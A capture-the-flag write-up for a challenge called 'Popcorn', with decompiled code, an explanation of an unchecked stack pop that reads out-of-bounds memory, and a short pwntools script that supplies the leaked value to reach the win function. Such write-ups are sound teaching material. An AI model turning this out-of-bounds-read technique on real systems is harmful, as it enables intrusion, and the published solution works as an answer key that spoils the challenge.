# Popcorn

## Solution

This program operates using a makeshift stack. It starts by filling the stack with `10` random items:
```
0040121b      srand(x: time(nullptr))
00401262      for (int32_t var_c = 0; var_c s<= 9; var_c = var_c + 1)
00401229          int32_t rax_1 = rand()
00401255          push(rax_1 - ((((sx.q(rax_1) * 0x68db8bad) u>> 0x20).d s>> 0xc) - (rax_1 s>> 0x1f)) * 0x2710 + 1)
```
Then the program loops, popping the stack, and breaking out of the loop when the user inputs the top of the stack. When the program leaves the loop, it prints the flag:
```
0040126e      while (true)
0040126e          puts(str: "Welcome to unlimited popcorn...Gâ€¦")
00401289          int32_t var_14
00401289          __isoc99_scanf(format: &data_40204a, &var_14)
0040128e          int32_t rax_5 = pop()
004012aa          printf(format: "Popped value: %d\n", zx.q(rax_5))
004012b5          if (rax_5 == var_14)
004012bc              if (var_14 != 0)
004012bc                  break
004012be      win()
```
The problem with this program is that the pop function does not check that it is going out of bounds:
```
004011d7      int32_t rax_2 = *((sx.q(top) << 2) + &stack)
004011e6      top = top - 1
004011f0      return zx.q(rax_2)
```
Thus, the stack will eventually start accessing memory that is out of bounds. The goal is to find a spot in memory with a predictable value, pop the stack until we hit that value, and then guess it. Inspection of the binary found that the value `4195626` occurs after popping the stack `77` times. Thus, we pop `77` times and then input `4195626` to get the flag.
```python
p = start()

for i in range(77):
    p.sendlineafter(b'number: ', b'0')

p.sendlineafter(b'number: ', b'4195626')

p.interactive()
```